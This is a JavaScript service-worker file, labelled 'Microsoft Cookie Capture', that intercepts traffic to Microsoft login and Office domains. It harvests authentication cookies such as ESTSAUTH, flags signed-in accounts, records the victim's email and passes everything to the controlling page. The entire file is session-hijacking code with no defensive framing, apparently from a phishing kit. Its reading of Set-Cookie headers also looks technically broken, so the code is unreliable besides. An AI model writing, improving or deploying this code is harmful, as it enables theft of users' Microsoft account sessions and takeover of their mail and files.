// public/service-worker.js
/**
 * Service Worker for Microsoft Cookie Capture
 * Intercepts and captures cookies from login.microsoftonline.com
 * Automatically detects signed-in Microsoft accounts
 */

const MICROSOFT_DOMAINS = [
  'login.microsoftonline.com',
  'login.microsoft.com',
  'account.microsoft.com',
  'outlook.com',
  'office.com',
  'login.live.com',
  'office365.com'
];

// Store captured cookies and metadata
let capturedCookieStore = {
  cookies: [],
  lastCapture: null,
  accountDetected: false,
  signedIn: false,
  email: null,
  timestamp: null
};

/**
 * Check if URL is a Microsoft domain
 */
function isMicrosoftDomain(urlString) {
  try {
    const url = new URL(urlString);
    return MICROSOFT_DOMAINS.some(domain => 
      url.hostname === domain || url.hostname.endsWith('.' + domain)
    );
  } catch (e) {
    return false;
  }
}

/**
 * Extract cookies from Set-Cookie headers
 */
function extractCookiesFromHeaders(headers) {
  const cookies = [];
  
  if (headers.has('set-cookie')) {
    const setCookieHeader = headers.get('set-cookie');
    const cookieStrings = setCookieHeader.split(',');
    
    cookieStrings.forEach(cookieString => {
      const parsed = parseCookieString(cookieString.trim());
      if (parsed) {
        cookies.push(parsed);
      }
    });
  }
  
  return cookies;
}

/**
 * Parse individual cookie string
 */
function parseCookieString(cookieStr) {
  const parts = cookieStr.split(';').map(p => p.trim());
  const [nameValue] = parts;
  
  if (!nameValue || !nameValue.includes('=')) {
    return null;
  }
  
  const [name, value] = nameValue.split('=').map(p => p.trim());
  const cookie = {
    name: name,
    value: value,
    domain: '',
    path: '/',
    secure: false,
    httpOnly: false,
    sameSite: 'None',
    expires: null,
    session: true
  };
  
  // Parse cookie attributes
  for (let i = 1; i < parts.length; i++) {
    const attr = parts[i];
    
    if (attr.toLowerCase().startsWith('domain=')) {
      cookie.domain = attr.substring(7);
    } else if (attr.toLowerCase().startsWith('path=')) {
      cookie.path = attr.substring(5);
    } else if (attr.toLowerCase().startsWith('expires=')) {
      cookie.expires = attr.substring(8);
      cookie.session = false;
    } else if (attr.toLowerCase() === 'secure') {
      cookie.secure = true;
    } else if (attr.toLowerCase() === 'httponly') {
      cookie.httpOnly = true;
    } else if (attr.toLowerCase().startsWith('samesite=')) {
      cookie.sameSite = attr.substring(9);
    }
  }
  
  return cookie;
}

/**
 * Detect if Microsoft account is already signed in
 */
function detectSignedInAccount(requestUrl, responseHeaders) {
  // Check for authentication cookies
  const authCookies = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'ESTSECAUTH'];
  
  if (responseHeaders.has('set-cookie')) {
    const setCookieHeader = responseHeaders.get('set-cookie');
    return authCookies.some(authCookie => setCookieHeader.includes(authCookie));
  }
  
  return false;
}

/**
 * Intercept fetch requests
 */
self.addEventListener('fetch', (event) => {
  const { request } = event;
  const requestUrl = request.url;
  
  // Only intercept Microsoft domain requests
  if (!isMicrosoftDomain(requestUrl)) {
    return;
  }
  
  console.log('🔍 Service Worker: Intercepting Microsoft domain request:', requestUrl);
  
  event.respondWith(
    fetch(request)
      .then((response) => {
        // Clone the response to avoid consuming it
        const clonedResponse = response.clone();
        
        try {
          // Extract cookies from response headers
          const responseCookies = extractCookiesFromHeaders(clonedResponse.headers);
          
          if (responseCookies.length > 0) {
            console.log('🍪 Service Worker: Captured cookies from response:', responseCookies);
            
            // Store cookies
            capturedCookieStore.cookies = [
              ...capturedCookieStore.cookies,
              ...responseCookies
            ];
            capturedCookieStore.lastCapture = new Date().toISOString();
            
            // Check if signed-in account detected
            if (detectSignedInAccount(requestUrl, clonedResponse.headers)) {
              console.log('✅ Service Worker: Signed-in account detected');
              capturedCookieStore.accountDetected = true;
              capturedCookieStore.signedIn = true;
            }
            
            // Send message to client about captured cookies
            self.clients.matchAll().then(clients => {
              clients.forEach(client => {
                client.postMessage({
                  type: 'COOKIES_CAPTURED',
                  data: {
                    cookies: responseCookies,
                    totalCookies: capturedCookieStore.cookies.length,
                    accountDetected: capturedCookieStore.accountDetected,
                    timestamp: capturedCookieStore.lastCapture
                  }
                });
              });
            });
          }
        } catch (error) {
          console.error('❌ Service Worker: Error processing cookies:', error);
        }
        
        return response;
      })
      .catch((error) => {
        console.error('❌ Service Worker: Fetch error:', error);
        throw error;
      })
  );
});

/**
 * Handle messages from clients
 */
self.addEventListener('message', (event) => {
  const { type, data } = event.data;
  
  console.log('💬 Service Worker: Received message:', type);
  
  switch (type) {
    case 'GET_CAPTURED_COOKIES':
      // Send captured cookies to client
      event.ports[0].postMessage({
        success: true,
        cookies: capturedCookieStore.cookies,
        accountDetected: capturedCookieStore.accountDetected,
        signedIn: capturedCookieStore.signedIn,
        lastCapture: capturedCookieStore.lastCapture
      });
      break;
      
    case 'CLEAR_COOKIES':
      // Clear captured cookies
      capturedCookieStore.cookies = [];
      capturedCookieStore.lastCapture = null;
      capturedCookieStore.accountDetected = false;
      event.ports[0].postMessage({ success: true });
      break;
      
    case 'SET_EMAIL':
      // Store email for tracking
      capturedCookieStore.email = data.email;
      event.ports[0].postMessage({ success: true });
      break;
      
    case 'GET_STORE_STATE':
      // Return current store state
      event.ports[0].postMessage({
        success: true,
        state: capturedCookieStore
      });
      break;
      
    default:
      console.warn('❌ Service Worker: Unknown message type:', type);
      event.ports[0].postMessage({ success: false, error: 'Unknown message type' });
  }
});

/**
 * Handle service worker activation
 */
self.addEventListener('activate', (event) => {
  console.log('✅ Service Worker: Activated');
  event.waitUntil(self.clients.claim());
});

/**
 * Handle service worker installation
 */
self.addEventListener('install', (event) => {
  console.log('✅ Service Worker: Installed');
  self.skipWaiting();
});